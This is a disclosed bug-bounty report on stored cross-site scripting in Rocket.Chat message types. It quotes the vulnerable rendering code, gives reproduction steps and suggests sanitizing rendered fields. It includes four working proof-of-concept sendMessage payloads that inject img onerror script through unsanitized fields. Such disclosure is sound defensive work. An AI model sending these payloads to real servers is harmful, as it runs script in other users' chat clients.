# XSS in various MessageTypes

## Report Details
- **Report ID**: 1379400
- **URL**: https://hackerone.com/reports/1379400
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-10-23T19:43:08.122Z
- **Disclosed**: 2024-08-10T21:55:12.427Z

## Reporter
- **Username**: gronke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
## Summary

Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client.

## Description

Messages in Rocket.Chat can have various types that influence the rendering as seen in [app/ui-message/client/message.js#L24-L53](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/ui-message/client/message.js#L24-L53):

```javascript
const renderBody = (msg, settings) => {
	const searchedText = msg.searchedText ? msg.searchedText : '';
	const isSystemMessage = MessageTypes.isSystemMessage(msg);
	const messageType = MessageTypes.getType(msg) || {};

	if (messageType.render) {
		msg = messageType.render(msg);
	} else if (messageType.template) {
		// render template
	} else if (messageType.message) {
		msg.msg = escapeHTML(msg.msg);
		msg = TAPi18n.__(messageType.message, { ...typeof messageType.data === 'function' && messageType.data(msg) });
	} else if (msg.u && msg.u.username === settings.Chatops_Username) {
		msg.html = msg.msg;
		msg = renderMentions(msg);
		msg = msg.html;
	} else {
		msg = renderMessageBody(msg);
	}

	if (isSystemMessage) {
		msg.html = Markdown.parse(msg.html);
	}

	if (searchedText) {
		msg = msg.replace(new RegExp(searchedText, 'gi'), (str) => `<mark>${ str }</mark>`);
	}

	return msg;
};
```

These MessageTypes are registered on startup of Rocket.Chat, like in this example the Message Snippeting Feature [app/message-snippet/client/messageType.js#L4-L16](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/message-snippet/client/messageType.js#L4-L16)

```javascript
import { MessageTypes } from '../../ui-utils';

Meteor.startup(function() {
	MessageTypes.registerType({
		id: 'message_snippeted',
		system: true,
		message: 'Snippeted_a_message',
		data(message) {
			const snippetLink = `<a href="/snippet/${ message.snippetId }/${ encodeURIComponent(message.snippetName) }">${ escapeHTML(message.snippetName) }</a>`;
			return { snippetLink };
		},
	});
});
```

Unlike most other MessageTypes, not the messages sanitized `msg` parameter is rendered, but `snippetName` and `snippetId`. The unsanitized `message.snippetId` leads to arbitrary script execution in the client displaying a maliciously crafted message.

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "message_snippeted",
  snippetId: "\"><img src=x onerror=alert(1) style=\"display: none;\" x=\"",
  snippetName: ""
}, (...args) => console.log(...args));
```

Another MessageTypes have been found to be affected similarly:

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "subscription-role-removed",
  role: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "livechat_transfer_history",
  transferData: {
    scope: "agent",
    transferredTo: {
      name: "<img src=x onerror=alert(1) />"
    }
  }
}, (...args) => console.log(...args));
```

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "omnichannel_placed_chat_on_hold",
  comment: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

## Releases Affected:

  * 3.18.2
  * 4.0.3

## Steps To Reproduce (from initial installation to vulnerability):

1.) Login to Rocket.Chat
2.) Find any Room ID (window URL path from direct messages or avatar image path from channels)
3.) Call `sendMessage` Meteor Method with `t` parameter and the affected source parameter

## Suggested mitigation

  * Sanitize message parameters rendered from MessageType `render` or `data` functions

## Impact

Authenticated adversaries can craft messages that exploit XSS in the displaying frontend clients.

## Attachments
No attachments
